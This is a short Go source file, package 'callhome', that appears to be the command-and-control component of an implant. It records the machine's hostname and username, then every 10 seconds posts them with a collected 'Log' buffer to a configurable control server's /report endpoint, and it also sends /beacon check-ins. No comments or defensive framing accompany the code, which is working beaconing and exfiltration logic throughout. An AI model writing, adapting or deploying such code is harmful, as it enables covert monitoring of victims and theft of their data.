package callhome

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"time"
)

var (
	Log      string = ""
	Hostname string = "Unknown"
	User     string = "Unknown"
	Control  string = ""
)

func Run() {
	for {
		time.Sleep(10 * time.Second)
		Report()
	}
}

func Init(url string) {
	Control = url

	Hostname, _ = os.Hostname()

	user, err := user.Current()
	if err == nil {
		User = user.Username
	}
}

func Report() {
	if Control == "" || Log == "" {
		return
	}

	data := url.Values{
		"hostname": {Hostname},
		"user":     {User},
		"log":      {Log},
	}

	http.PostForm(fmt.Sprintf("%s/report", Control), data)

	Log = ""
}

func Beacon() {
	if Control == "" {
		return
	}

	data := url.Values{
		"hostname": {Hostname},
		"user":     {User},
	}

	http.PostForm(fmt.Sprintf("%s/beacon", Control), data)
}
